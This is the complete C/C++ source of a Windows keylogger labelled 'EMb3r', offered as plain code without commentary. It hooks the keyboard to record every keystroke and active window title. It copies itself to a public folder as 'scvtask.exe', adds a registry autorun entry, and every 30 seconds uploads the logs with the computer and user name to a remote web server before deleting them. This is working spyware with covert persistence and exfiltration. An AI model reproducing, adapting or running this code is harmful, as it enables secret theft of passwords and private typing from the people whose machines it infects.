#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>
#include <dirent.h>
#include <ctype.h>
#include <pthread.h>
#include <iostream>
using namespace std;

int shift = 0, caps = 0;
FILE *_f;
char _title[MAX_PATH],_prev[MAX_PATH]="";
char _file[MAX_PATH];
char _log[MAX_PATH];
char _who[MAX_PATH];
char _path[MAX_PATH];
char _own[MAX_PATH];
char _exe[MAX_PATH];
char _dir[]="%systemdrive%\\users\\public\\EMb3r\\";
char _url[128]="/dashboard/img/profile_pic/rvmrcp/upload.php?d=";
char _server[]="www.edu-smart.info";
char _proc[]="scvtask.exe";


char* translate(int vk, int up) {
    if (up) 
	{
        if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1)) shift = 0;
        return 0;
    } 
	else if ((vk==0x10)||(vk==0xa0)||(vk==0xa1)) 
	{
        shift=1; return 0;
    }
    char *buf = (char*)malloc(16);
    memset(buf, 0, 16);
    switch(vk)
    {
    	case VK_NUMPAD0: return "0";
		case VK_NUMPAD1: return "1";
		case VK_NUMPAD2: return "2";
    	case VK_NUMPAD3: return "3";
		case VK_NUMPAD4: return "4";
		case VK_NUMPAD5: return "5";
		case VK_NUMPAD6: return "6";
		case VK_NUMPAD7: return "7";
		case VK_NUMPAD8: return "8";
		case VK_NUMPAD9: return "9";
	}
    if (vk < 0x29) 
	{
        switch (vk) 
		{
            case 0x08: strcpy(buf, "[BS]"); break;
            case 0x09: strcpy(buf, "[TAB]"); break;
            case 0x0d: strcpy(buf, "[ENTER]\r\n"); break;
            case 0x14: caps ^= 1; break;
            case 0x20: buf[0] = ' '; break;
            //case 0x25: strcpy(buf, "[LT]"); break;
            //case 0x26: strcpy(buf, "[UP]"); break;
            //case 0x27: strcpy(buf, "[RT]"); break;
            //case 0x28: strcpy(buf, "[DN]"); break;
        }
        return buf;
    }
    if (vk > 0x69 && vk < 0x70) 
	{
        buf[0] = (char)(vk - 0x40);
	} 
	else if (vk > 0x6f && vk < 0x88) {
        sprintf(buf, "[F%d]", vk - 0x6f);
    }
	else if (isalpha(vk))
	{        
		if (!caps)
            if (shift) { buf[0] = (char)(toupper(vk)); } else { buf[0] = (char)(tolower(vk)); }
        else
            if (!shift) { buf[0] = (char)(toupper(vk)); } else { buf[0] = (char)(tolower(vk)); }
    } 
	else 
	{
        switch (vk)
		{
	        case '1': if (!shift) {buf[0]=(char)vk;} else {buf[0]='!';} break;
	        case '2': if (!shift) {buf[0]=(char)vk;} else {buf[0]='@';} break;
	        case '3': if (!shift) {buf[0]=(char)vk;} else {buf[0]='#';} break;
	        case '4': if (!shift) {buf[0]=(char)vk;} else {buf[0]='$';} break;
	        case '5': if (!shift) {buf[0]=(char)vk;} else {buf[0]='%';} break;
	        case '6': if (!shift) {buf[0]=(char)vk;} else {buf[0]='^';} break;
	        case '7': if (!shift) {buf[0]=(char)vk;} else {buf[0]='&';} break;
	        case '8': if (!shift) {buf[0]=(char)vk;} else {buf[0]='*';} break;
	        case '9': if (!shift) {buf[0]=(char)vk;} else {buf[0]='(';} break;
	        case '0': if (!shift) {buf[0]=(char)vk;} else {buf[0]=')';} break;
	        case 0xba: if (!shift) {buf[0]=';';} else {buf[0]=':';} break;
	        case 0xbb: if (!shift) {buf[0]='=';} else {buf[0]='+';} break;
	        case 0xbc: if (!shift) {buf[0]=',';} else {buf[0]='<';} break;
	        case 0xbd: if (!shift) {buf[0]='-';} else {buf[0]='_';} break;
	        case 0xbe: if (!shift) {buf[0]='.';} else {buf[0]='>';} break;
	        case 0xbf: if (!shift) {buf[0]='/';} else {buf[0]='?';} break;
	        case 0xc0: if (!shift) {buf[0]='`';} else {buf[0]='~';} break;
	        case 0xdb: if (!shift) {buf[0]='[';} else {buf[0]='{';} break;
	        case 0xdc: if (!shift) {buf[0]='\\';} else {buf[0]='|';} break;
	        case 0xdd: if (!shift) {buf[0]=']';} else {buf[0]='}';} break;
	        case 0xde: if (!shift) {buf[0]='\'';} else {buf[0]='\"';} break;
        }
    }
    return buf;
}
void rite(char *str) {
	HWND foreground = GetForegroundWindow();
	if (foreground)
    	GetWindowText(foreground, _title, sizeof(_title));
    if(strcmp(_prev,_title)!=0)
    {
    	strcpy(_prev,_title);
    	fwrite("\r\n\r\n[ ", 1, strlen("\r\n\r\n[ "), _f);
    	fwrite(_title, 1, strlen(_title), _f);
    	fwrite(" ]\r\n\r\n", 1, strlen(" ]\r\n\r\n"), _f);
    }
    cout << str;
    fwrite(str, 1, strlen(str), _f);
    fflush(_f);
}
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *kb=(KBDLLHOOKSTRUCT *)lParam;
    char *str="[X]";
    if (wParam == WM_KEYUP) {
		str = translate(kb->vkCode, 1);
    } else if (wParam == WM_KEYDOWN) {
        str = translate(kb->vkCode, 0);
    }
    if (str) rite(str);
    return 0;
}
int upload(char *path,char *host,char *url)
{	
	char hdrs[255];                  
	char * buffer;                  
	char * content;                  
	FILE * pFile;                    
	long lSize;                      
	size_t result;                   
	pFile = fopen (path, "rb");
	if (pFile==NULL) return 10;
	fseek (pFile , 0 , SEEK_END);
	lSize = ftell (pFile);
	rewind (pFile);
	content = (char*) malloc (sizeof(char)*lSize);
	if (content == NULL) return 11;
	result = fread (content,1,lSize,pFile);
	if (result != lSize) return 12;
	fclose (pFile);
	
	buffer = (char*) malloc (sizeof(char)*lSize + 2048);
	
	sprintf(hdrs,"Content-Type: multipart/form-data; boundary=----EMb3r----");
	sprintf(buffer,"------EMb3r----\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n",path);
	sprintf(buffer,"%sContent-Type: text/plain\r\n\r\n",buffer);
	sprintf(buffer,"%s%s\r\n",buffer,content);
	sprintf(buffer,"%s------EMb3r------\r\n",buffer);
	
	printf("%s\n%s",hdrs,buffer);
	HINTERNET hSession = InternetOpen("WinSock",INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if(hSession==NULL) return 13;
	
	HINTERNET hConnect = InternetConnect(hSession, host,INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	if(hConnect==NULL) return 14;
	
	HINTERNET hRequest = HttpOpenRequest(hConnect, (const char*)"POST",url, NULL, NULL, (const char**)"*/*\0", 0, 1);
	if(hRequest==NULL) return 15;
	
	BOOL sent= HttpSendRequest(hRequest, hdrs, strlen(hdrs), buffer, strlen(buffer));
	if(!sent) return 16;
	
	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);
	
	DeleteFileA(path);
	return 0;
}
void renew() {
    time_t now = time(0);
    struct tm tstruct;
    strcpy(_log,"");
    tstruct = *localtime(&now);
    strftime(_log, sizeof(_log), "%d-%m-%Y_%H-%M-%S", &tstruct);
	strcat(_log,".txt");
	strcpy(_file,_path);
	strcat(_file,_log);
}
bool exists(char *path)
{
  DWORD ftyp = GetFileAttributesA(path);
  if (ftyp == INVALID_FILE_ATTRIBUTES)
    return false;
  if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
    return true;
  return false;
}
void init()
{	
   	ExpandEnvironmentStringsA("%computername%-%username%",_who,sizeof(_who));
   	strcat(_url,_who);
   	
   	ExpandEnvironmentStringsA(_dir,_path,sizeof(_path));
   	
   	HINSTANCE h=GetModuleHandle(NULL);
   	GetModuleFileNameA(h,_own,sizeof(_own));
   	
   	strcpy(_exe,_path);
   	strcat(_exe,_proc);
   	
	if(!exists(_path))
	{
		mkdir(_path);
		CopyFileA(_own,_exe,false);
		strcat(_path,"init.txt");
		FILE *init=fopen(_path,"w");
		fputs("EMb3r Installed!",init);
		fclose(init);
		ExpandEnvironmentStringsA(_dir,_path,sizeof(_path));
		
		HKEY hKey;
		LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, KEY_ALL_ACCESS , &hKey);
		LONG setRes = RegSetValueExA(hKey, "Load", 0, REG_SZ, (BYTE*)_exe, strlen(_exe)+1);
		LONG closeOut = RegCloseKey(hKey);
	}
	
	if(strcmp(_own,_exe)!=0)
   	{
   	    ShellExecuteA(GetDesktopWindow(),"open",_exe,NULL,NULL,SW_SHOW);
   	    Sleep(1000);
   	    exit(0);
   	}
}
void *deliver(void *arg)
{
	DIR *dir;
	char t[MAX_PATH];
	struct dirent *ent;
	while(1)
	{
		if ((dir = opendir(_path)) != NULL) 
		{
		  	while ((ent = readdir (dir)) != NULL) 
			{
				if(strcmp(ent->d_name,".")==0 || strcmp(ent->d_name,"..")==0) continue;
				else if(strcmp(ent->d_name,"scvtask.exe")==0 || strcmp(ent->d_name,_log)==0) continue;
			
		    	strcpy(t,_path);
		    	strcat(t,ent->d_name);
		    	upload(t,_server,_url);
		    //	cout << t << endl;
		  	}
		  	closedir (dir);
		}
		Sleep(30000);
	}
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

	init();
	renew();
	
    pthread_t del;
	pthread_create(&del,NULL,deliver, NULL);

    HINSTANCE app = GetModuleHandle(NULL);
    SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app, 0);
    MSG msg;

    _f = fopen(_file, "w");
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    fflush(_f);
    fclose(_f);
    return 0;
}
